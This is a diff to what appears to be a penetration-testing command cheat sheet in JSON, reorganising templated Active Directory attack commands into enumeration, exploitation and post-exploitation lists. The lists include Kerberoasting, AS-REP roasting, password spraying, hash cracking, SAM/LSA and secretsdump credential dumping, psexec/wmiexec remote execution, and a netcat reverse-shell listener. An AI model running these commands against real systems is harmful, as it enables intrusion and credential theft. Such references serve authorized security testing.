@@ -4,6 +4,10 @@
       "nmap -p- --open -sS --min-rate 5000 -n -Pn {{IP}} -vvv",
       "smbclient -L //{{IP}} -U {{USER}}",
       "impacket-lookupsid {{DOMAIN}}/{{USER}}@{{IP}}",
+      "enum4linux {{IP}}",
+      "enum4linux-ng {{IP}}",
+      "ftp -a {{IP}}",
+      "ftp {{USER}}@{{IP}}",	
       "netexec smb {{IP}} -u '{{USER}}' -p '{{PASSWORD}}' --rid-brute",
       "netexec smb {{IP}} -u '{{USER}}' -p '{{PASSWORD}}' --shares",
       "netexec smb {{IP}} -u {{USER}} -p '{{PASSWORD}}' --pass-pol'",
@@ -13,25 +17,24 @@
     ],
     "exploitation": [
       "impacket-GetNPUsers {{DOMAIN}}/ -no-pass -usersfile users.txt -dc-ip {{IP}} -format john",
-      "evil-winrm -i {{DOMAIN}} -u {{USER}} -p '{{PASSWORD}}'",
       "impacket-GetUserSPNs -dc-ip {{IP}} {{DOMAIN}}/{{USER}}:'{{PASSWORD}}' -request",
       "john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt",
-      "netexec smb {{IP}} --local-auth -u {{USER}} -p '{{PASSWORD}}' --sam",
-      "netexec smb {{IP}} --local-auth -u {{USER}} -p '{{PASSWORD}}' --lsa",
       "netexec smb {{IP}} -u {{USER}} -p password.txt --continue-on-succes",
       "python3 targetedKerberoast.py -v -d {{DOMAIN}} -u {{USER}} -p '{{PASSOWRD}}' --request-user TARGET_USER",
-      "impacket-psexec {{DOMAIN}}/{{USER}}:'{{PASSWORD}}'@{{IP}}",
-      "impacket-secretsdump {{DOMAIN}}/{{USER}}:'{{PASSWORD}}'@{{IP}}",
-      "impacket-wmiexec {{DOMAIN}}/{{USER}}:'{{PASSWORD}}'@{{IP}}",
-      "impacket-mssqlclient {{USER}}@{{IP}} -windows-auth",
-      "python3 gMSADumper.py -u {{USER}} -p '{{PASSWORD}}' -d {{DOMAIN}}",
       "rlwrap -cAr nc -nlvp {{PORT}}",
       "xfreerdp3 /u:{{USER}} /p:'{{PASSWORD}}' /v:{{IP}}"                              
     ],
     "post-exploitation": [
+      "evil-winrm -i {{DOMAIN}} -u {{USER}} -p '{{PASSWORD}}'",
+      "impacket-mssqlclient {{USER}}@{{IP}} -windows-auth",
+      "impacket-psexec {{DOMAIN}}/{{USER}}:'{{PASSWORD}}'@{{IP}}",
+      "impacket-secretsdump {{DOMAIN}}/{{USER}}:'{{PASSWORD}}'@{{IP}}",
+      "impacket-wmiexec {{DOMAIN}}/{{USER}}:'{{PASSWORD}}'@{{IP}}",
+      "python3 gMSADumper.py -u {{USER}} -p '{{PASSWORD}}' -d {{DOMAIN}}",
+      "netexec smb {{IP}} --local-auth -u {{USER}} -p '{{PASSWORD}}' --sam",
+      "netexec smb {{IP}} --local-auth -u {{USER}} -p '{{PASSWORD}}' --lsa",
       "impacket-reg {{DOMAIN}}/{{USER}}:{{PASSWORD}}@{{IP}} query -keyName HKLM\\SOFTWARE\\",
       "certipy-ad auth -pfx administrator.pfx -ldap-shell -dc-ip {{IP}}"
-      
     ]
   },
   "web": {
